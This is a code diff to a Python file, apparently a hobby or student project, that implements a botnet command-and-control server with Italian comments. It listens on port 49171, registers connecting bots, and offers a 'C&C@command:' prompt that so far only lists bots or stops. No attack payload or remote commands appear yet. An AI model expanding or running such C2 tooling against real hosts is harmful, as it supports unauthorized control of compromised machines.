@@ -4,6 +4,7 @@ from concurrent.futures import ThreadPoolExecutor
 from time import sleep
 
 
+
 class CC:
 
     #lista dei bot attivi con le relative porte
@@ -35,8 +36,8 @@ class CC:
 
     def listen(self):
         try:
-            s = socket.socket()
-            s.bind((socket.gethostname(), 49171))
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.bind(('', 49171))
             print("Server is listening")
             while(True):
                 s.listen()
@@ -44,17 +45,23 @@ class CC:
                 data = conn.recv(1024).decode()
                 data = data.split(" ")
                 self.addBot(data[0], data[1].strip('][').split(','))
-                self.setBotStatus(data[0], data[2])
+                self.setBotStatus(data[0], "waiting")
                 data = "bot registrated succesfully"
                 conn.send(data.encode())
                 conn.close()
         except:
-            print("Listening error")
+            print("Listening errors")
             return
 
     def command(self):
         sleep(1)
-        print("command: ")
+        while(True):
+            comando = input("C&C@command: ")
+            if comando == "stop":
+                break
+            if comando == "ls":
+                print(self.activeBot)
+        return
 
 #avvia il C&C
 def startCC():
@@ -63,7 +70,9 @@ def startCC():
     with ThreadPoolExecutor(max_workers=2) as exec:
         r1 = exec.submit(cc.listen)
         r2 = exec.submit(cc.command)
-        done, not_done = concurrent.futures.wait([r1,r2], return_when=concurrent.futures.FIRST_EXCEPTION)
-        exec.shutdown()
+        done, not_done = concurrent.futures.wait([r1,r2], return_when=concurrent.futures.FIRST_COMPLETED)
+        exec.shutdown(wait=False)
+        return
+
 if __name__=="__main__":
     startCC()
